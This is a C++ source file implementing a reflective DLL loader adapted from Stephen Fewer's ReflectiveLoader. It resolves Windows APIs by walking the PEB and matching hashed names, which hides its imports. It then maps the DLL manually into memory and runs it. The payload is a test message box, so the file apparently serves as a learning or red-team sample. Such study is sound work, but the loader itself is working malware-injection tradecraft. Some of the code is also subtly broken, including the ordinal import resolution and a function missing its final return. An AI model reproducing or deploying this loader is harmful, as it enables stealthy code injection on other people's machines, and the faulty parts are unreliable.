/*
Title: Reflective DLL Injection (DLL)
Description: This DLL will be loaded by the injector.
Resources:
    - https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
*/

#include "ReflectiveDll.hpp"
#include "Nt.hpp"

#pragma intrinsic(_ReturnAddress)

VOID* Memcpy(PVOID pDest, PVOID pSrc, SIZE_T dwSize) {
    CHAR* sDest = static_cast<CHAR*>(pDest);
    CONST CHAR* sSrc = static_cast<CHAR*>(pSrc);

    for (SIZE_T i = 0; i < dwSize; ++i) {
        sDest[i] = sSrc[i];
    }

    return pDest;
}

ULONG StringToHashModule(WCHAR* pwStr, SIZE_T dwStrLen) {
    ULONG dwHash = HASH_IV;
    WCHAR* pwStr2 = pwStr;
    SIZE_T dwCnt = 0;

    do {
        WCHAR wc = *pwStr2;
        if (!wc) break;

        // uppercase -> lowercase
        if (wc >= L'A' && wc <= L'Z') {
            wc += L'a' - L'A';
        }

        dwHash = dwHash * RANDOM_ADDR + wc;
        ++pwStr2;
        dwCnt++;

        if (dwStrLen > 0 && dwCnt >= dwStrLen) break;
    } while (TRUE);

    return dwHash & 0xFFFFFFFF;
}

DWORD StringToHashFunc(CHAR* str) {
    INT c;
    DWORD dwHash = HASH_IV;

    while (c = *str++) {
        dwHash = dwHash * RANDOM_ADDR + c;
    }

    return dwHash & 0xFFFFFFFF;
}

PVOID GetModuleByHash(DWORD dwHash) {
    PTEB pTeb = NtCurrentTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLdr = pPeb->Ldr;

    // Get the first entry.
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;
    while (pDte) {
        if (StringToHashModule(pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == dwHash) {
            return pDte->DllBase;
        }

        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
}

PVOID GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
    PVOID pFuncAddr = nullptr;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

    DWORD_PTR dwpExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + dwpExportDirRVA);

    PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfFunctions);
    PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNames);
    PWORD pdwAddrOfNameOrdsRVA = (PWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++) {
        DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
        DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
        CHAR* sFuncName = (CHAR*)dwpFuncNameRVA;
        DWORD_PTR dwpFuncAddrRVA = 0;

        DWORD dwFuncNameHash = StringToHashFunc(sFuncName);
        if (dwFuncNameHash == dwHash) {
            dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdsRVA[i]];
            pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
            return pFuncAddr;
        }
    }

    return nullptr;
}

VOID ResolveIAT(
    LPVOID lpVirtualAddr,
    LPVOID lpIatDir,
    LPPROC_LOADLIBRARYA lpLoadLibraryA,
    LPPROC_GETPROCADDRESS lpGetProcAddress
) {
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = nullptr;

    for (pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)lpIatDir;pImportDescriptor->Name != 0; ++pImportDescriptor) {
        HMODULE hImportModule = lpLoadLibraryA((LPCSTR)((ULONG_PTR)lpVirtualAddr + pImportDescriptor->Name));

        PIMAGE_THUNK_DATA pOriginalTD = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpVirtualAddr + pImportDescriptor->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFirstTD = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpVirtualAddr + pImportDescriptor->FirstThunk);
        
        for (; pOriginalTD->u1.Ordinal != 0; ++pOriginalTD, ++pFirstTD) {
            if (IMAGE_SNAP_BY_ORDINAL(pOriginalTD->u1.Ordinal)) {
                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)hImportModule + ((PIMAGE_DOS_HEADER)hImportModule)->e_lfanew);
                PIMAGE_DATA_DIRECTORY pImageDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hImportModule + (ULONG_PTR)lpIatDir);

                ULONG_PTR uFuncAddresses = (ULONG_PTR)hImportModule + pExportDir->AddressOfFunctions;
                uFuncAddresses += ((IMAGE_ORDINAL(pOriginalTD->u1.Ordinal) - pExportDir->Base) * sizeof(DWORD));

                ULONGLONG uFunc = (ULONGLONG)((ULONG_PTR)hImportModule + uFuncAddresses);
                if (uFunc)
                    pFirstTD->u1.Function = uFunc;
            }
            else {
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)lpVirtualAddr + pOriginalTD->u1.AddressOfData);
                ULONGLONG uFunc = (ULONGLONG)lpGetProcAddress(hImportModule, (LPCSTR)pImportByName->Name);
                if (uFunc)
                    pFirstTD->u1.Function = uFunc;
            }
        }
    }
}

VOID ReallocateSections(
    LPVOID lpVirtualAddr,
    LPVOID lpImageBase,
    LPVOID lpBaseRelocDir,
    PIMAGE_NT_HEADERS pNtHeaders
) {
    ULONG_PTR uOffset = (ULONG_PTR)lpVirtualAddr - pNtHeaders->OptionalHeader.ImageBase;

    while (((PIMAGE_BASE_RELOCATION)lpBaseRelocDir)->SizeOfBlock) {
        ULONG_PTR uBaseRelocRVA = ((ULONG_PTR)lpVirtualAddr + ((PIMAGE_BASE_RELOCATION)lpBaseRelocDir)->VirtualAddress);
        ULONG_PTR uRelocEntry = (ULONG_PTR)lpBaseRelocDir + sizeof(IMAGE_BASE_RELOCATION);

        DWORD dwNumOfEntries = (((PIMAGE_BASE_RELOCATION)lpBaseRelocDir)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
        while (dwNumOfEntries--) {
            if (((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_DIR64)
                *(ULONG_PTR*)(uBaseRelocRVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += uOffset;
            else if (((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGHLOW)
                *(DWORD*)(uBaseRelocRVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += (DWORD)uOffset;
            else if (((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGH)
                *(WORD*)(uBaseRelocRVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += HIWORD(uOffset);
            else if (((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_LOW)
                *(WORD*)(uBaseRelocRVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += LOWORD(uOffset);

            uRelocEntry += sizeof(IMAGE_RELOC);
        }

        lpBaseRelocDir = (LPVOID)((DWORD_PTR)lpBaseRelocDir + ((PIMAGE_BASE_RELOCATION)lpBaseRelocDir)->SizeOfBlock);
    }
}

DLLEXPORT ULONG_PTR caller(VOID) {
    return (ULONG_PTR)_ReturnAddress();
}

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // Get this function's base address.
    LPVOID lpAddr = (LPVOID)caller();

    // -------------------------------------------------------------------------------
    // Get module handlers and function pointers.
    // -------------------------------------------------------------------------------

    HMODULE hNtdll = (HMODULE)GetModuleByHash(HASH_MODULE_NTDLL);
    if (!hNtdll) return FALSE;
    HMODULE hKernel32 = (HMODULE)GetModuleByHash(HASH_MODULE_KERNEL32);
    if (!hKernel32) return FALSE;

    LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = reinterpret_cast<LPPROC_NTFLUSHINSTRUCTIONCACHE>(GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE));
    LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<LPPROC_LOADLIBRARYA>(GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
    LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<LPPROC_GETPROCADDRESS>(GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
    LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<LPPROC_VIRTUALALLOC>(GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
    LPPROC_VIRTUALPROTECT lpVirtualProtect = reinterpret_cast<LPPROC_VIRTUALPROTECT>(GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT));

    // -------------------------------------------------------------------------------
    // Allocate virtual memory.
    // -------------------------------------------------------------------------------

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpAddr + ((PIMAGE_DOS_HEADER)lpAddr)->e_lfanew);
    PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    LPVOID lpVirtualAddr = lpVirtualAlloc(
        nullptr,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!lpVirtualAddr) return FALSE;

    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        Memcpy(
            (LPVOID)((DWORD_PTR)lpVirtualAddr + pSecHeader[i].VirtualAddress),
            (LPVOID)((DWORD_PTR)lpAddr + pSecHeader[i].PointerToRawData),
            pSecHeader[i].SizeOfRawData
        );
    }

    // -------------------------------------------------------------------------------
    // Resolve IAT (Import Address Table).
    // -------------------------------------------------------------------------------

    PIMAGE_DATA_DIRECTORY pImageDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!pImageDir->VirtualAddress) return FALSE;

    ResolveIAT(
        lpVirtualAddr,
        (LPVOID)((DWORD_PTR)lpVirtualAddr + pImageDir->VirtualAddress),
        lpLoadLibraryA,
        lpGetProcAddress
    );

    // -------------------------------------------------------------------------------
    // Reallocate image.
    // -------------------------------------------------------------------------------

    pImageDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!pImageDir) return FALSE;

    ReallocateSections(
        lpVirtualAddr,
        (LPVOID)pNtHeaders->OptionalHeader.ImageBase,
        (LPVOID)((DWORD_PTR)lpVirtualAddr + pImageDir->VirtualAddress),
        pNtHeaders
    );

    // -------------------------------------------------------------------------------
    // Set protections for each section.
    // -------------------------------------------------------------------------------

    LPVOID lpSec = nullptr;
    SIZE_T dwSecSize = 0;
    DWORD dwProtect = 0;
    DWORD dwOldProtect = PAGE_READWRITE;

    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        lpSec = (LPVOID)((DWORD_PTR)lpVirtualAddr + pSecHeader[i].VirtualAddress);
        dwSecSize = pSecHeader[i].SizeOfRawData;

        if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtect = PAGE_WRITECOPY;
        if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtect = PAGE_READONLY;
        if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtect = PAGE_READWRITE;
        if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtect = PAGE_EXECUTE;
        if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtect = PAGE_EXECUTE_WRITECOPY;
        if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtect = PAGE_EXECUTE_READ;
        if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtect = PAGE_EXECUTE_READWRITE;

        lpVirtualProtect(lpSec, dwSecSize, dwProtect, &dwOldProtect);
    }

    // -------------------------------------------------------------------------------
    // Execute DLL
    // -------------------------------------------------------------------------------

    LPPROC_DLLMAIN lpDllMain = reinterpret_cast<LPPROC_DLLMAIN>((ULONG_PTR)lpVirtualAddr + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    lpNtFlushInstructionCache((HANDLE)-1, nullptr, 0);
    lpDllMain((HINSTANCE)lpVirtualAddr, DLL_PROCESS_ATTACH, nullptr);

    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(nullptr, L"This is a test.", L"ReflectiveDll", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

